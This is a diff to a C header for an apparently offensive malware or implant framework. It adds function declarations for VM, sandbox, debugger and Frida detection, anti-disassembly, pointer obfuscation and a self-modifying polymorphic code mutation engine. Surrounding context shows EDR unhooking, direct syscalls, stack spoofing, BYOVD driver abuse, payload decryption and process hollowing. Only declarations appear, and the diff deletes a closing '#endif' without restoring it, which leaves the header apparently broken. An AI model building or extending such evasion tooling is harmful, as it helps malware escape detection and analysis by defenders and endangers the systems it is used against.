@@ -20,6 +20,9 @@ typedef enum {
     JOCKY_ANALYSIS_SANDBOX = 1 << 2,
 } jocky_analysis_flags_t;
 
+/* Function pointer type for obfuscation/deobfuscation helpers */
+typedef void (*obfuscated_func_t)(void);
+
 /* Run all anti-analysis checks. Returns bitmask of detected threats. */
 uint32_t jocky_check_analysis_environment(void);
 
@@ -30,9 +33,36 @@ bool jocky_check_hardware_breakpoints(void);
 bool jocky_is_vm(void);
 bool jocky_is_sandbox(void);
 
+/* Enhanced VM detection */
+bool jocky_is_hyperv(void);
+bool jocky_is_xen(void);
+bool jocky_is_kvm(void);
+bool jocky_is_vmware(void);
+bool jocky_is_virtualbox(void);
+bool jocky_is_qemu(void);
+
+/* Enhanced sandbox detection */
+bool jocky_detect_sandbox_filesystem(void);
+bool jocky_detect_analysis_processes(void);
+bool jocky_detect_analysis_environment(void);
+bool jocky_detect_execution_tracing(void);
+
 /* Timing checks */
 bool jocky_check_timing_rdtsc(void);
 bool jocky_check_timing_api(void);
+
+/* Anti-disassembly techniques */
+uintptr_t jocky_hide_function_entry(uintptr_t func_ptr);
+void jocky_cross_function_obfuscate(void);
+bool jocky_detect_disasm_hooks(void);
+bool jocky_has_polymorphic_encoding(uint8_t* code_ptr, size_t len);
+bool jocky_detect_cfg_hooks(void);
+bool jocky_detect_static_analysis(void);
+obfuscated_func_t jocky_obfuscate_function_ptr(obfuscated_func_t func);
+obfuscated_func_t jocky_deobfuscate_function_ptr(obfuscated_func_t func);
+bool jocky_detect_string_logging(void);
+bool jocky_detect_frida_hooks(void);
+void jocky_anti_disasm_init(void);
 
 /* ============================================================================
  * Evasion: Unhooking, Syscalls, Stack Spoofing
@@ -493,6 +523,9 @@ bool jocky_cleanup_all(void);
  * Returns NULL on failure or if size <= 0. */
 void* jocky_alloc(int64_t size);
 
+/* Safe allocation with error code return. Sets *out on success. */
+int32_t jocky_alloc_safe(int64_t size, void **out);
+
 /* Free a buffer previously returned by jocky_alloc. No-op on NULL. */
 void  jocky_free(void* ptr);
 
@@ -512,8 +545,14 @@ void  jocky_byovd_destroy(void* ctx);
 /* Simple XOR decrypt in-place. Key rotates per byte. */
 void jocky_decrypt_xor(uint8_t* data, size_t len, uint8_t key);
 
+/* Safe XOR decrypt with validation - returns error code */
+int32_t jocky_decrypt_xor_safe(uint8_t* data, size_t len, uint8_t key);
+
 /* RC4-based stream decrypt */
 void jocky_decrypt_rc4(uint8_t* data, size_t len, const uint8_t* key, size_t key_len);
+
+/* Safe RC4 decrypt with validation - returns error code */
+int32_t jocky_decrypt_rc4_safe(uint8_t* data, size_t len, const uint8_t* key, size_t key_len);
 
 /* ============================================================================
  * Integrity Verification
@@ -644,7 +683,91 @@ bool jocky_process_hollow_linux(uint32_t pid, const void* payload, uint64_t payl
  */
 uint32_t jocky_spawn_hollow_linux(const char* target_path, const void* payload, uint64_t payload_size);
 
-#endif /* !_WIN32 */
+/* ============================================================================
+ * Polymorphic Obfuscation: Runtime Mutation and Randomization
+ * ============================================================================ */
+
+/* Core polymorphic mutation API - see mutation.h for full documentation */
+typedef void (*mutation_pass_fn)(uint8_t *code, size_t len);
+
+typedef struct {
+    const char *name;
+    mutation_pass_fn apply;
+    int priority;
+    int weight;
+} MutationPass;
+
+typedef struct {
+    MutationPass *passes;
+    int pass_count;
+    uint32_t seed;
+    int intensity;
+} MutationEngine;
+
+typedef struct {
+    uintptr_t start;
+    uintptr_t end;
+    uintptr_t fallthrough;
+} BasicBlock;
+
+typedef struct {
+    uintptr_t address;
+    uint8_t *mutation_payload;
+    size_t payload_len;
+    int mutation_count;
+    uint32_t checksum;
+} SelfModifyingSegment;
+
+typedef struct {
+    uint32_t mutations_applied;
+    uint32_t instructions_modified;
+    uint32_t blocks_reordered;
+    uint32_t self_modifications;
+    uint64_t total_cycles;
+} MutationStats;
+
+/* Initialize mutation engine with optional seed and intensity (1-5) */
+void jocky_mutation_init(MutationEngine *engine, uint32_t seed, int intensity);
+
+/* Apply random polymorphic mutations to code buffer */
+void jocky_apply_polymorphic_mutations(uint8_t *code, size_t len);
+
+/* Apply mutations with specific intensity level */
+void jocky_apply_mutations_intensity(uint8_t *code, size_t len, int intensity);
+
+/* Randomization utilities */
+void jocky_seed_rng(uint32_t seed);
+uint32_t jocky_random_u32(void);
+uint64_t jocky_random_u64(void);
+uint32_t jocky_random_range(uint32_t min, uint32_t max);
+void jocky_shuffle_array(void *array, size_t count, size_t elem_size);
+
+/* Instruction-level mutations */
+void jocky_mutate_instructions(uint8_t *code, size_t len);
+void jocky_mutate_constants(uint8_t *code, size_t len);
+void jocky_inject_junk_code(uint8_t *code, size_t len);
+void jocky_mutate_bitwise_ops(uint8_t *code, size_t len);
+void jocky_mutate_data_values(uint8_t *code, size_t len);
+
+/* Control flow mutations */
+BasicBlock *jocky_extract_basic_blocks(uint8_t *code, size_t len, int *out_count);
+void jocky_randomize_cfg(uint8_t *code, size_t len);
+void jocky_create_polymorphic_dispatch(uint8_t *code, size_t len);
+void jocky_randomize_switch_cases(uint8_t *code, size_t len);
+
+/* Self-modifying code */
+void jocky_enable_code_mutation(uintptr_t code_addr, size_t code_len);
+void jocky_apply_self_mutations(SelfModifyingSegment *segment);
+void jocky_enable_periodic_mutation(int interval_seconds);
+uint32_t jocky_compute_code_checksum(uint8_t *code, size_t len);
+bool jocky_verify_code_integrity(SelfModifyingSegment *segment);
+
+/* Mutation statistics and control */
+MutationStats jocky_get_mutation_stats(void);
+void jocky_reset_mutation_stats(void);
+void jocky_set_mutation_enabled(bool enabled);
+bool jocky_is_mutation_enabled(void);
+void jocky_reshuffle_mutations(void);
 
 #ifdef __cplusplus
 }
